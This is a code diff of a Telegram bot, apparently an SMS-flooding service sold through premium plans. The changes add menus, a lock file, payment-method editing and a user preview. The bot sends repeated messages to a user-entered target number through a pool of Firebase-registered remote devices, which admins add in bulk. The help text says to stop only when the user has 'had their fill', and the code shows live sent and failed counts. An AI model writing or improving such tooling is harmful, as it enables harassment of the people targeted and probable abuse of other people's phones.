@@ -1,9 +1,9 @@
 # ══════════════════════════════════════════════════════════════
-#   SMS BOT v15.3 — FINAL NIJWM 💎
+#   SMS BOT v16.0 — FINAL FIXED EDITION 💎
 #   By NIJWM
 # ══════════════════════════════════════════════════════════════
 
-import asyncio, json, os, re, time, logging, zipfile, io, random
+import asyncio, json, os, re, time, logging, zipfile, io, random, sys
 from datetime import datetime
 
 import aiohttp
@@ -11,8 +11,14 @@ from aiogram                     import Bot, Dispatcher, F, Router
 from aiogram.types               import (Message, CallbackQuery,
                                          InlineKeyboardMarkup,
                                          InlineKeyboardButton,
+                                         ReplyKeyboardMarkup,
+                                         KeyboardButton,
+                                         ReplyKeyboardRemove,
                                          BufferedInputFile,
-                                         ChatJoinRequest)
+                                         ChatJoinRequest,
+                                         BotCommand,
+                                         MenuButtonCommands,
+                                         BotCommandScopeDefault)
 from aiogram.filters             import Command
 from aiogram.fsm.context         import FSMContext
 from aiogram.fsm.state           import State, StatesGroup
@@ -28,7 +34,8 @@ OWNER_ID  = 7165783614
 DEFAULT_ADMINS = [7165783614]
 
 _DATA_FILE = "bot_data.json"
-_VERSION   = "v15.3"
+_LOCK_FILE = "bot.lock"
+_VERSION   = "v16.0"
 _CREDITS   = "NIJWM"
 _OWNER_UN  = "@nijwmz"
 
@@ -49,6 +56,32 @@ logging.getLogger("aiogram.event").setLevel(logging.WARNING)
 
 _fb_sem   = asyncio.Semaphore(FB_FETCH_CONCURRENT)
 _send_sem = asyncio.Semaphore(SEND_CONCURRENT)
+
+# ══════════════════════════════════════════════
+#  LOCK FILE (prevent multiple instances)
+# ══════════════════════════════════════════════
+_lock_fd = None
+def acquire_lock() -> bool:
+    global _lock_fd
+    try:
+        import fcntl
+        _lock_fd = open(_LOCK_FILE, "w")
+        fcntl.flock(_lock_fd, fcntl.LOCK_EX | fcntl.LOCK_NB)
+        _lock_fd.write(str(os.getpid()))
+        _lock_fd.flush()
+        return True
+    except Exception as e:
+        log.error(f"Another instance is running (lock: {e})")
+        return False
+
+def release_lock():
+    global _lock_fd
+    try:
+        if _lock_fd:
+            import fcntl
+            fcntl.flock(_lock_fd, fcntl.LOCK_UN)
+            _lock_fd.close()
+    except Exception: pass
 
 # ══════════════════════════════════════════════
 #  PHONE NORMALIZER
@@ -221,10 +254,6 @@ def role_badge(uid, d) -> str:
         return "💎"
     return "✨"
 
-def is_public_callback(c) -> bool:
-    """Only these run even without access. Admin sub-callbacks MUST fall through."""
-    return c in ("home", "fj:check", "help:show", "about:show")
-
 # ══════════════════════════════════════════════
 #  FORCE JOIN
 # ══════════════════════════════════════════════
@@ -284,7 +313,6 @@ def is_payment_set(pay) -> bool:
     return bool(pay.get("upi") or pay.get("qr") or pay.get("binance") or pay.get("crypto"))
 
 def kb(*rows):
-    """Bulletproof keyboard builder — accepts tuples OR InlineKeyboardButton."""
     ikb = []
     for row in rows:
         out_row = []
@@ -297,6 +325,24 @@ def kb(*rows):
         if out_row: ikb.append(out_row)
     return InlineKeyboardMarkup(inline_keyboard=ikb)
 
+# ── Reply keyboard (bottom persistent) ─────────
+RK_TEST     = "🧪  Quick Test SMS"
+RK_DASH     = "📊  Dashboard"
+RK_PREM     = "💎  Premium"
+RK_HELP     = "📖  Help"
+RK_DEV      = "👨‍💻  Developer"
+RK_ADMIN    = "🛡  Admin Panel"
+
+def reply_main_kb(uid, d):
+    rows = [
+        [KeyboardButton(text=RK_TEST)],
+        [KeyboardButton(text=RK_DASH), KeyboardButton(text=RK_PREM)],
+        [KeyboardButton(text=RK_HELP), KeyboardButton(text=RK_DEV)],
+    ]
+    if is_admin(uid, d):
+        rows.append([KeyboardButton(text=RK_ADMIN)])
+    return ReplyKeyboardMarkup(keyboard=rows, resize_keyboard=True, is_persistent=True)
+
 # ══════════════════════════════════════════════
 #  TEXTS
 # ══════════════════════════════════════════════
@@ -305,28 +351,28 @@ def home_text(uid, d, u):
         f"<b>⚡  SMS BOT  ·  PREMIUM</b>\n"
         f"<code>{_VERSION}</code>   ·   <i>By {_CREDITS}</i>\n"
         f"{line()}\n\n"
-        f"{role_badge(uid, d)}  <b>{role_label(uid, d)}</b>"
+        f"{role_badge(uid, d)}  <b>{role_label(uid, d)}</b>\n\n"
+        f"<i>Use the buttons below 👇</i>"
     )
 
 HELP_TEXT = f"""
 <b>📖  HELP CENTER</b>
 {line()}
 
-<b>🚀  Shuru kaise karein</b>
+<b>🚀  Quick Start</b>
 
-<b>1.</b>  <b>🧪 Test SMS</b> pe tap karo
-<b>2.</b>  Target number daalo
-<b>3.</b>  Message likho
-<b>4.</b>  Live progress dekho
-<b>5.</b>  🛑 Stop — jab mann bhar jaye 😄
+<b>1.</b>  Tap <b>{RK_TEST}</b>
+<b>2.</b>  Enter target number
+<b>3.</b>  Enter message
+<b>4.</b>  Watch live progress
+<b>5.</b>  🛑 Stop anytime
 
 {line()}
 
 <b>💎  Premium Access</b>
 
-Plan chuno → Payment karo →
-Screenshot bhejo → Admin verify karega →
-Premium unlock 🎉
+Choose plan → Pay → Send screenshot →
+Admin verifies → Premium unlocked.
 
 {line()}
 
@@ -336,7 +382,7 @@ Premium unlock 🎉
 <code>+919876543210</code>
 <code>9876543210</code>
 
-<{line()}>
+{line()}
 
 <b>👨‍💻  Credits</b>
 
@@ -370,13 +416,13 @@ def premium_landing_text(d):
     )
 
 # ══════════════════════════════════════════════
-#  KEYBOARDS
+#  KEYBOARDS (Inline)
 # ══════════════════════════════════════════════
 def main_menu(uid, d):
     rows = [
-        [("🧪  Test SMS",     "test:go"),   ("📊  Dashboard",  "dash:show")],
-        [("💎  Premium",      "prem:menu"), ("📖  Help",       "help:show")],
-        [("👨‍💻  Developer",   "about:show")],
+        [("🧪  Quick Test SMS", "test:go"),  ("📊  Dashboard",  "dash:show")],
+        [("💎  Premium",        "prem:menu"),("📖  Help",       "help:show")],
+        [("👨‍💻  Developer",     "about:show")],
     ]
     if is_admin(uid, d):
         rows.append([("🛡  Admin Panel", "adm:menu")])
@@ -429,7 +475,7 @@ def adm_menu_kb(uid, d):
 def prem_admin_kb(d):
     prem = d.get("premium", {})
     on = prem.get("enabled")
-    toggle = "🔴  Disable" if on else "🟢  Enable"
+    toggle = "🔴  Disable Premium" if on else "🟢  Enable Premium"
     reqs = len([r for r in prem.get("requests", []) if r.get("status") == "pending"])
     req_label = f"📥  Requests ({reqs})" if reqs else "📥  Requests"
     users_count = len(prem.get("users", {}))
@@ -437,7 +483,8 @@ def prem_admin_kb(d):
         [(toggle, "prem:toggle")],
         [("➕  Add Premium User", "prem:add")],
         [(f"👥  Premium Users ({users_count})", "prem:users")],
-        [("📝  Edit Plans", "prem:editplans"), ("💳  Payment", "prem:editpay")],
+        [("📝  Edit Plans", "prem:editplans")],
+        [("💳  Payment Methods", "prem:editpay")],
         [(req_label, "prem:reqs"), ("📜  History", "prem:hist")],
         [("◀️  Back", "adm:menu")],
     ]
@@ -451,17 +498,24 @@ def prem_plans_edit_kb(d):
     return kb(*rows)
 
 def prem_pay_edit_kb(d):
+    """Show all 4 payment methods with their current state."""
     pay = d.get("premium", {}).get("payment", {})
-    def stat(v): return "✅" if v else "❌"
-    upi_short = (pay.get("upi", "") or "not set")[:14]
-    binance_short = (pay.get("binance", "") or "not set")[:14]
-    crypto_short = (pay.get("crypto", "") or "not set")[:14]
-    qr_stat = "Set" if pay.get("qr") else "not set"
+    def tick(v): return "✅" if v else "❌"
+
+    upi_val = pay.get("upi", "") or ""
+    upi_show = upi_val[:18] if upi_val else "not set"
+    binance_val = pay.get("binance", "") or ""
+    binance_show = binance_val[:18] if binance_val else "not set"
+    crypto_val = pay.get("crypto", "") or ""
+    crypto_show = crypto_val[:18] if crypto_val else "not set"
+    qr_show = "uploaded" if pay.get("qr") else "not set"
+
     rows = [
-        [(f"🏦  UPI     {stat(pay.get('upi'))}  {upi_short}", "prem:setupi")],
-        [(f"📱  QR      {stat(pay.get('qr'))}  {qr_stat}",     "prem:setqr")],
-        [(f"🟡  Binance {stat(pay.get('binance'))}  {binance_short}", "prem:setbinance")],
-        [(f"🪙  Crypto  {stat(pay.get('crypto'))}  {crypto_short}", "prem:setcrypto")],
+        [(f"{tick(pay.get('upi'))}  🏦 UPI       — {upi_show}",        "prem:setupi")],
+        [(f"{tick(pay.get('qr'))}  📱 QR Code   — {qr_show}",          "prem:setqr")],
+        [(f"{tick(pay.get('binance'))}  🟡 Binance   — {binance_show}", "prem:setbinance")],
+        [(f"{tick(pay.get('crypto'))}  🪙 Crypto    — {crypto_show}",   "prem:setcrypto")],
+        [("🧪  Preview as User", "prem:preview")],
         [("◀️  Back", "adm:prem")],
     ]
     return kb(*rows)
@@ -779,7 +833,7 @@ async def _cleanup_job(uid):
     if job and job.state != "running": _active_jobs.pop(uid, None)
 
 # ══════════════════════════════════════════════
-#  STARTUP BROADCAST  (with /start button)
+#  BROADCAST
 # ══════════════════════════════════════════════
 async def notify_all_users_online(bot, bot_username):
     try:
@@ -787,12 +841,10 @@ async def notify_all_users_online(bot, bot_username):
         d = load()
         uids = list(d.get("users", {}).keys())
         if not uids: return
-
         start_url = f"https://t.me/{bot_username}?start=1"
         launch_kb = InlineKeyboardMarkup(inline_keyboard=[[
             InlineKeyboardButton(text="🚀  Let's Start", url=start_url)
         ]])
-
         text = (
             f"<b>🚀  BOT IS ONLINE</b>\n"
             f"{line()}\n\n"
@@ -814,9 +866,6 @@ async def notify_all_users_online(bot, bot_username):
     except Exception as e:
         log.error(f"startup broadcast: {e}")
 
-# ══════════════════════════════════════════════
-#  BROADCAST
-# ══════════════════════════════════════════════
 async def _do_broadcast(bot, text, progress_msg=None):
     d = load()
     uids = list(d.get("users", {}).keys())
@@ -885,6 +934,104 @@ async def sedit(cq, text, markup=None):
 # ══════════════════════════════════════════════
 R = Router()
 
+# ══════════════════════════════════════════════
+#  SHARED LOGIC (used by both inline + reply keyboard)
+# ══════════════════════════════════════════════
+async def _goto_home(bot, uid, send_fn):
+    d = load()
+    if not can_use(uid, d):
+        if premium_mode_on(d):
+            await send_fn(premium_landing_text(d), premium_cta_kb())
+        else:
+            await send_fn("🚫 Access denied. Contact admin.")
+        return
+    u = usr(uid, d)
+    await send_fn(home_text(uid, d, u), main_menu(uid, d))
+
+async def _goto_test_sms(bot, uid, send_fn):
+    d = load()
+    if not can_use(uid, d):
+        await send_fn("🚫 Access denied."); return
+    existing = _active_jobs.get(uid)
+    if existing and existing.state == "running":
+        await send_fn("⚠️ A job is already running. Stop it first."); return
+    if not d.get("firebase_pool"):
+        await send_fn("❌ Service unavailable."); return
+    await send_fn(
+        f"<b>🧪 Quick Test SMS</b>\n{line()}\n\n"
+        f"Send target number:\n"
+        f"<code>+919876543210</code>\n"
+        f"<code>+91 98765 43210</code>\n"
+        f"<code>9876543210</code>",
+        kb([("❌  Cancel","home")]))
+
+async def _goto_dashboard(bot, uid, send_fn):
+    d2 = load(); u2 = usr(uid, d2)
+    s = u2.get("stats", {})
+    sent = s.get("sent", 0); fail = s.get("failed", 0)
+    total = sent + fail
+    bar = pbar_solid(sent, total) if total else "░"*14
+    rate = pct(sent, total) if total else "0%"
+    badge = role_badge(uid, d2)
+    live = ""
+    job = _active_jobs.get(uid)
+    if job and job.state == "running":
+        js = job.snapshot()
+        live = (f"\n{line()}\n🚀  <code>{js['done']}/{js['total']}</code>  "
+                f"✅<code>{js['sent']}</code>  ❌<code>{js['failed']}</code>")
+    await send_fn(
+        f"<b>📊 Dashboard</b>\n{line()}\n\n"
+        f"{badge} <b>{role_label(uid, d2)}</b>\n\n"
+        f"📨 Total  : <code>{total}</code>\n{line()}\n"
+        f"<code>{bar}</code>  <b>{rate}</b>\n{line()}\n\n"
+        f"✅ <code>{sent}</code>   ❌ <code>{fail}</code>   🕐 <code>{str(s.get('last','—'))[:10]}</code>"
+        f"{live}",
+        kb([("🔄  Refresh","dash:show"), ("🏠  Home","home")]))
+
+async def _goto_premium(bot, uid, send_fn):
+    d = load()
+    if is_admin(uid, d):
+        prem = d["premium"]
+        on = prem.get("enabled")
+        reqs = len([r for r in prem.get("requests", []) if r.get("status") == "pending"])
+        await send_fn(
+            f"<b>💎 Premium Control</b>\n{line()}\n\n"
+            f"Status  : {'🟢 ON' if on else '🔴 OFF'}\n"
+            f"Users   : <code>{len(prem.get('users',{}))}</code>\n"
+            f"Pending : <code>{reqs}</code>",
+            kb([("🛡  Open Panel","adm:prem"), ("🏠  Home","home")])); return
+    if not premium_mode_on(d):
+        await send_fn(
+            f"<b>💎 Premium</b>\n{line()}\n\nBot is currently <b>FREE</b> 🎉\n\nEnjoy!",
+            kb([("🏠  Home","home")])); return
+    if is_premium_user(uid, d):
+        pu = d["premium"]["users"].get(str(uid), {})
+        exp = pu.get("expires")
+        exp_txt = "Lifetime" if exp is None else fmt_date(exp)
+        await send_fn(
+            f"<b>💎 Your Subscription</b>\n{line()}\n\n"
+            f"Plan     : <b>{pu.get('label','?')}</b>\n"
+            f"Expires  : <code>{exp_txt}</code>",
+            kb([("🏠  Home","home")])); return
+    await send_fn(premium_landing_text(d), premium_cta_kb())
+
+async def _goto_help(bot, uid, send_fn):
+    await send_fn(HELP_TEXT, kb([("◀️  Back","home")]))
+
+async def _goto_about(bot, uid, send_fn):
+    await send_fn(ABOUT_TEXT, kb([("◀️  Back","home")]))
+
+async def _goto_admin(bot, uid, send_fn):
+    d = load()
+    if not is_admin(uid, d):
+        await send_fn("🚫 Admin only."); return
+    await send_fn(
+        f"<b>🛡 Admin Panel</b>\n{line()}\n\n<i>Full control</i>",
+        adm_menu_kb(uid, d))
+
+# ══════════════════════════════════════════════
+#  COMMANDS
+# ══════════════════════════════════════════════
 @R.message(Command("start"))
 async def c_start(msg: Message, state: FSMContext):
     try:
@@ -892,7 +1039,7 @@ async def c_start(msg: Message, state: FSMContext):
         d = load(); uid = msg.from_user.id
         if is_banned(uid, d):
             await msg.answer("🚫 Access denied."); return
-        u = usr(uid, d); save(d)
+        usr(uid, d); save(d)
         ok, not_joined = await check_force_join(msg.bot, uid, d)
         if not ok:
             await msg.answer("📢  <b>Join Required</b>\n\nPlease join to continue:",
@@ -904,8 +1051,12 @@ async def c_start(msg: Message, state: FSMContext):
             else:
                 await msg.answer("🚫 Access denied. Contact admin.")
             return
+        u = usr(uid, d)
         await msg.answer(home_text(uid, d, u),
             reply_markup=main_menu(uid, d), parse_mode="HTML")
+        # show reply keyboard too
+        await msg.answer("👇 Tap any button below",
+            reply_markup=reply_main_kb(uid, d))
     except Exception as e: log.error(f"/start: {e}")
 
 @R.message(Command("menu"))
@@ -922,6 +1073,8 @@ async def c_menu(msg: Message, state: FSMContext):
         u = usr(uid, d)
         await msg.answer(home_text(uid, d, u),
             reply_markup=main_menu(uid, d), parse_mode="HTML")
+        await msg.answer("👇 Quick buttons",
+            reply_markup=reply_main_kb(uid, d))
     except Exception as e: log.error(f"/menu: {e}")
 
 @R.message(Command("stop"))
@@ -952,6 +1105,93 @@ async def h_join_req(update: ChatJoinRequest):
     except Exception: pass
 
 # ══════════════════════════════════════════════
+#  REPLY KEYBOARD TEXT HANDLERS
+#  (registered FIRST so they intercept even during FSM)
+# ══════════════════════════════════════════════
+async def _reply_wrap(msg: Message, state: FSMContext, fn):
+    """Helper to call shared logic from reply keyboard with FSM reset."""
+    try:
+        await state.clear()
+    except Exception: pass
+    async def send(text, markup=None):
+        try:
+            await msg.answer(text, reply_markup=markup, parse_mode="HTML")
+        except TelegramBadRequest as e:
+            log.error(f"reply send: {e}")
+    await fn(msg.bot, msg.from_user.id, send)
+
+@R.message(F.text == RK_TEST)
+async def rk_test(msg: Message, state: FSMContext):
+    try:
+        await state.clear()
+        d = load(); uid = msg.from_user.id
+        if not can_use(uid, d):
+            await msg.answer("🚫 Access denied. Send /start"); return
+        existing = _active_jobs.get(uid)
+        if existing and existing.state == "running":
+            await msg.answer("⚠️ A job is already running. Stop it first."); return
+        if not d.get("firebase_pool"):
+            await msg.answer("❌ Service unavailable."); return
+        await state.set_state(W.test_to)
+        await msg.answer(
+            f"<b>🧪 Quick Test SMS</b>\n{line()}\n\n"
+            f"Send target number:\n"
+            f"<code>+919876543210</code>\n"
+            f"<code>+91 98765 43210</code>\n"
+            f"<code>9876543210</code>",
+            parse_mode="HTML",
+            reply_markup=kb([("❌  Cancel","home")]))
+    except Exception as e: log.error(f"rk_test: {e}")
+
+@R.message(F.text == RK_DASH)
+async def rk_dash(msg: Message, state: FSMContext):
+    try:
+        await state.clear()
+        d = load(); uid = msg.from_user.id
+        if not can_use(uid, d):
+            await msg.answer("🚫 Access denied."); return
+        async def send(text, markup=None):
+            await msg.answer(text, reply_markup=markup, parse_mode="HTML")
+        await _goto_dashboard(msg.bot, uid, send)
+    except Exception as e: log.error(f"rk_dash: {e}")
+
+@R.message(F.text == RK_PREM)
+async def rk_prem(msg: Message, state: FSMContext):
+    try:
+        await state.clear()
+        async def send(text, markup=None):
+            await msg.answer(text, reply_markup=markup, parse_mode="HTML")
+        await _goto_premium(msg.bot, msg.from_user.id, send)
+    except Exception as e: log.error(f"rk_prem: {e}")
+
+@R.message(F.text == RK_HELP)
+async def rk_help(msg: Message, state: FSMContext):
+    try:
+        await state.clear()
+        async def send(text, markup=None):
+            await msg.answer(text, reply_markup=markup, parse_mode="HTML")
+        await _goto_help(msg.bot, msg.from_user.id, send)
+    except Exception as e: log.error(f"rk_help: {e}")
+
+@R.message(F.text == RK_DEV)
+async def rk_dev(msg: Message, state: FSMContext):
+    try:
+        await state.clear()
+        async def send(text, markup=None):
+            await msg.answer(text, reply_markup=markup, parse_mode="HTML")
+        await _goto_about(msg.bot, msg.from_user.id, send)
+    except Exception as e: log.error(f"rk_dev: {e}")
+
+@R.message(F.text == RK_ADMIN)
+async def rk_admin(msg: Message, state: FSMContext):
+    try:
+        await state.clear()
+        async def send(text, markup=None):
+            await msg.answer(text, reply_markup=markup, parse_mode="HTML")
+        await _goto_admin(msg.bot, msg.from_user.id, send)
+    except Exception as e: log.error(f"rk_admin: {e}")
+
+# ══════════════════════════════════════════════
 #  FSM HANDLERS
 # ══════════════════════════════════════════════
 @R.message(W.fb_url)
@@ -965,18 +1205,15 @@ async def f_fb_url(msg, state):
             await msg.answer("❌ URL must start with <code>https://</code>",
                 parse_mode="HTML"); return
         fb_url = text.rstrip("/")
-
         if any(fb["url"].rstrip("/") == fb_url for fb in d.get("firebase_pool", [])):
             await state.clear()
             await msg.answer(f"<b>🔒 Already Added</b>\n{line()}\n\nThis URL is already in the pool.",
                 reply_markup=kb([("🏠  Home","home")]), parse_mode="HTML"); return
-
         await state.clear()
         wait = await msg.answer("🔍 Verifying…")
         status, n = await verify_fb(fb_url)
         try: await wait.delete()
         except: pass
-
         if status == "bad":
             await msg.answer(f"<b>❌ Connection Failed</b>\n{line()}\n\nURL or rules issue.",
                 reply_markup=kb([("🔙  Retry","wiz:start"), ("🏠  Home","home")]),
@@ -985,7 +1222,6 @@ async def f_fb_url(msg, state):
             await msg.answer(f"<b>❌ Empty</b>\n{line()}\n\n0 devices found.",
                 reply_markup=kb([("🔙  Retry","wiz:start"), ("🏠  Home","home")]),
                 parse_mode="HTML"); return
-
         d2 = load()
         d2["firebase_pool"].append({
             "id": str(int(time.time()*1000)) + "_" + str(random.randint(100,999)),
@@ -993,10 +1229,8 @@ async def f_fb_url(msg, state):
             "added_by": uid, "added_at": int(time.time()),
         })
         save(d2)
-
         devs = await fb_get(fb_url, "/clients.json") or {}
         online = sum(1 for v in devs.values() if dev_online(v))
-
         await msg.answer(
             f"<b>✅ Added</b>\n{line()}\n\n"
             f"📱 Online : <code>{online}</code>\n"
@@ -1020,18 +1254,15 @@ async def f_fb_bulk(msg, state):
         if not lines: await msg.answer("❌ No URLs found."); return
         if len(lines) > BULK_ADD_LIMIT:
             await msg.answer(f"⚠️ Max {BULK_ADD_LIMIT} URLs per batch."); return
-
         await state.clear()
         wait = await msg.answer(
             f"<b>📥 Bulk Add</b>\n{line()}\n\n"
             f"🔍 Verifying <b>{len(lines)}</b> URLs…",
             parse_mode="HTML")
-
         d2 = load()
         existing = {fb["url"].rstrip("/") for fb in d2.get("firebase_pool", [])}
         added = dup = bad = empty = 0
         sem = asyncio.Semaphore(20)
-
         async def _check(line):
             url = line.strip().rstrip("/")
             if not url.startswith("http"): return ("bad", url)
@@ -1039,9 +1270,7 @@ async def f_fb_bulk(msg, state):
             async with sem:
                 status, _n = await verify_fb(url)
             return (status, url)
-
         results = await asyncio.gather(*[_check(l) for l in lines], return_exceptions=True)
-
         for r in results:
             if isinstance(r, Exception) or not isinstance(r, tuple):
                 bad += 1; continue
@@ -1057,10 +1286,8 @@ async def f_fb_bulk(msg, state):
             elif status == "empty": empty += 1
             elif status == "dup":   dup += 1
             else:                    bad += 1
-
         try: await wait.delete()
         except: pass
-
         total = len(load().get("firebase_pool", []))
         await msg.answer(
             f"<b>✅ Bulk Add Complete</b>\n{line()}\n\n"
@@ -1208,6 +1435,7 @@ async def f_prem_price(msg, state):
             reply_markup=prem_plans_edit_kb(d), parse_mode="HTML")
     except Exception as e: log.error(f"prem_price: {e}"); await state.clear()
 
+# ── Payment method FSM handlers — INDEPENDENT ──
 @R.message(W.prem_upi)
 async def f_prem_upi(msg, state):
     try:
@@ -1216,7 +1444,9 @@ async def f_prem_upi(msg, state):
         d = load()
         d["premium"]["payment"]["upi"] = val if val != "/clear" else ""
         save(d); await state.clear()
-        await msg.answer("✅ UPI saved." if val != "/clear" else "🗑 Cleared.",
+        await msg.answer(
+            f"✅ UPI {'saved' if val != '/clear' else 'cleared'}.\n\n"
+            f"Current UPI: <code>{d['premium']['payment']['upi'] or '—'}</code>",
             reply_markup=prem_pay_edit_kb(d), parse_mode="HTML")
     except Exception as e: log.error(f"prem_upi: {e}"); await state.clear()
 
@@ -1228,13 +1458,15 @@ async def f_prem_qr(msg, state):
         if msg.text and msg.text.strip() == "/clear":
             d["premium"]["payment"]["qr"] = None
             save(d); await state.clear()
-            await msg.answer("🗑 QR cleared.", reply_markup=prem_pay_edit_kb(d), parse_mode="HTML"); return
+            await msg.answer("🗑 QR cleared.",
+                reply_markup=prem_pay_edit_kb(d), parse_mode="HTML"); return
         if msg.photo: file_id = msg.photo[-1].file_id
         elif msg.document: file_id = msg.document.file_id
         else: await msg.answer("❌ Send photo or /clear."); return
         d["premium"]["payment"]["qr"] = file_id
         save(d); await state.clear()
-        await msg.answer("✅ QR saved.", reply_markup=prem_pay_edit_kb(d), parse_mode="HTML")
+        await msg.answer("✅ QR saved.",
+            reply_markup=prem_pay_edit_kb(d), parse_mode="HTML")
     except Exception as e: log.error(f"prem_qr: {e}"); await state.clear()
 
 @R.message(W.prem_binance)
@@ -1245,7 +1477,9 @@ async def f_prem_binance(msg, state):
         d = load()
         d["premium"]["payment"]["binance"] = val if val != "/clear" else ""
         save(d); await state.clear()
-        await msg.answer("✅ Binance saved." if val != "/clear" else "🗑 Cleared.",
+        await msg.answer(
+            f"✅ Binance {'saved' if val != '/clear' else 'cleared'}.\n\n"
+            f"Current: <code>{d['premium']['payment']['binance'] or '—'}</code>",
             reply_markup=prem_pay_edit_kb(d), parse_mode="HTML")
     except Exception as e: log.error(f"prem_binance: {e}"); await state.clear()
 
@@ -1257,7 +1491,9 @@ async def f_prem_crypto(msg, state):
         d = load()
         d["premium"]["payment"]["crypto"] = val if val != "/clear" else ""
         save(d); await state.clear()
-        await msg.answer("✅ Crypto saved." if val != "/clear" else "🗑 Cleared.",
+        await msg.answer(
+            f"✅ Crypto {'saved' if val != '/clear' else 'cleared'}.\n\n"
+            f"Current: <code>{d['premium']['payment']['crypto'] or '—'}</code>",
             reply_markup=prem_pay_edit_kb(d), parse_mode="HTML")
     except Exception as e: log.error(f"prem_crypto: {e}"); await state.clear()
 
@@ -1388,37 +1624,19 @@ async def cb_stop(cq):
         log.error(f"cb_stop: {e}"); await cq.answer("❌")
 
 # ══════════════════════════════════════════════
-#  PREMIUM CALLBACKS — user-facing
+#  PREMIUM CALLBACKS
 # ══════════════════════════════════════════════
 @R.callback_query(F.data == "prem:menu")
 async def cb_prem_menu(cq, state):
     try:
-        d = load(); uid = cq.from_user.id
-        if is_admin(uid, d):
-            prem = d["premium"]
-            on = prem.get("enabled")
-            reqs = len([r for r in prem.get("requests", []) if r.get("status") == "pending"])
-            await sedit(cq,
-                f"<b>💎 Premium Control</b>\n{line()}\n\n"
-                f"Status  : {'🟢 ON' if on else '🔴 OFF'}\n"
-                f"Users   : <code>{len(prem.get('users',{}))}</code>\n"
-                f"Pending : <code>{reqs}</code>",
-                kb([("🛡  Open Panel","adm:prem"), ("🏠  Home","home")])); return
-        if not premium_mode_on(d):
-            await sedit(cq,
-                f"<b>💎 Premium</b>\n{line()}\n\nBot is currently <b>FREE</b> 🎉\n\nEnjoy!",
-                kb([("🏠  Home","home")])); return
-        if is_premium_user(uid, d):
-            pu = d["premium"]["users"].get(str(uid), {})
-            exp = pu.get("expires")
-            exp_txt = "Lifetime" if exp is None else fmt_date(exp)
-            await sedit(cq,
-                f"<b>💎 Your Subscription</b>\n{line()}\n\n"
-                f"Plan     : <b>{pu.get('label','?')}</b>\n"
-                f"Expires  : <code>{exp_txt}</code>",
-                kb([("🏠  Home","home")])); return
-        await sedit(cq, premium_landing_text(d), premium_cta_kb())
-    except Exception as e: log.error(f"prem:menu: {e}")
+        async def send(text, markup=None):
+            await sedit(cq, text, markup)
+        await _goto_premium(cq.bot, cq.from_user.id, send)
+        await cq.answer()
+    except Exception as e:
+        log.error(f"prem:menu: {e}")
+        try: await cq.answer()
+        except: pass
 
 @R.callback_query(F.data == "prem:plans")
 async def cb_prem_plans(cq, state):
@@ -1426,6 +1644,7 @@ async def cb_prem_plans(cq, state):
         d = load()
         await sedit(cq, f"<b>💎 Choose Your Plan</b>\n{line()}\n\nAll plans include full access:",
             plans_kb(d))
+        await cq.answer()
     except Exception as e: log.error(f"prem:plans: {e}")
 
 @R.callback_query(F.data.startswith("prem:plan:"))
@@ -1442,6 +1661,7 @@ async def cb_prem_plan_detail(cq, state):
             f"<b>💎 {plan['label']}  ·  ₹{plan['price']}</b>\n{line()}\n\n"
             f"Select your payment method:",
             methods_kb(plan_key, pay))
+        await cq.answer()
     except Exception as e: log.error(f"prem:plan_detail: {e}")
 
 @R.callback_query(F.data.startswith("prem:m:"))
@@ -1467,7 +1687,7 @@ async def cb_prem_method(cq, state):
                 f"<code>{value}</code>\n\n"
                 f"<i>Tap the ID above to copy</i>\n\n"
                 f"{line()}\n"
-                f"✅ Any UPI app works — GPay · PhonePe · Paytm",
+                f"✅ Any UPI app — GPay · PhonePe · Paytm",
                 pay_confirm_kb(plan_key, method))
         elif method == "binance":
             await sedit(cq,
@@ -1509,7 +1729,11 @@ async def cb_prem_method(cq, state):
                     parse_mode="HTML")
             except Exception as e:
                 log.error(f"qr send: {e}")
-    except Exception as e: log.error(f"prem:method: {e}")
+        await cq.answer()
+    except Exception as e:
+        log.error(f"prem:method: {e}")
+        try: await cq.answer()
+        except: pass
 
 @R.callback_query(F.data.startswith("prem:pay:"))
 async def cb_prem_pay(cq, state):
@@ -1531,6 +1755,7 @@ async def cb_prem_pay(cq, state):
             f"Admin will verify it manually.\n\n"
             f"<i>/cancel to abort</i>",
             kb([("❌  Cancel","home")]))
+        await cq.answer()
     except Exception as e: log.error(f"prem:pay: {e}")
 
 # ── Admin: Add premium ─────────────────────────
@@ -1544,6 +1769,7 @@ async def cb_prem_add(cq, state):
         await sedit(cq,
             f"<b>💎 Add Premium User</b>\n{line()}\n\nSend user's Telegram ID:",
             kb([("❌  Cancel","adm:prem")]))
+        await cq.answer()
     except Exception as e: log.error(f"prem:add: {e}")
 
 @R.callback_query(F.data.startswith("prem:addp:"))
@@ -1628,7 +1854,9 @@ async def cb_prem_rmok(cq, state):
                 f"<b>👥 Premium Users ({len(users)})</b>\n{line()}\n\nTap 🗑 to remove:",
                 prem_users_kb(users))
     except Exception as e:
-        log.error(f"prem:rmok: {e}"); await cq.answer("❌")
+        log.error(f"prem:rmok: {e}")
+        try: await cq.answer()
+        except: pass
 
 @R.callback_query(F.data.startswith("prem:rm:"))
 async def cb_prem_rm(cq, state):
@@ -1648,7 +1876,32 @@ async def cb_prem_rm(cq, state):
             f"<i>User will lose premium access.</i>",
             kb([("🗑  Yes, Remove", f"prem:rmok:{target}"),
                 ("❌  Cancel", "prem:users")]))
-    except Exception as e: log.error(f"prem:rm: {e}")
+        await cq.answer()
+    except Exception as e:
+        log.error(f"prem:rm: {e}")
+        try: await cq.answer()
+        except: pass
+
+# ── Preview as user ────────────────────────────
+@R.callback_query(F.data == "prem:preview")
+async def cb_prem_preview(cq, state):
+    try:
+        d = load(); uid = cq.from_user.id
+        if not is_admin(uid, d): await cq.answer("🚫", show_alert=True); return
+        pay = d["premium"]["payment"]
+        lines = [f"<b>🧪 User Preview — Payment Screen</b>", line(), ""]
+        if pay.get("upi"):     lines.append(f"🏦 UPI      : <code>{pay['upi']}</code>")
+        if pay.get("qr"):      lines.append(f"📱 QR Code  : ✅ uploaded")
+        if pay.get("binance"): lines.append(f"🟡 Binance  : <code>{pay['binance']}</code>")
+        if pay.get("crypto"):  lines.append(f"🪙 Crypto   : <code>{pay['crypto']}</code>")
+        if not is_payment_set(pay):
+            lines.append("<i>⚠️ No payment methods set yet</i>")
+        await sedit(cq, "\n".join(lines), kb([("◀️  Back","prem:editpay")]))
+        await cq.answer()
+    except Exception as e:
+        log.error(f"prem:preview: {e}")
+        try: await cq.answer()
+        except: pass
 
 # ── Payment approve / reject ───────────────────
 @R.callback_query(F.data.startswith("prem:approve:"))
@@ -1706,7 +1959,9 @@ async def cb_prem_approve(cq, state):
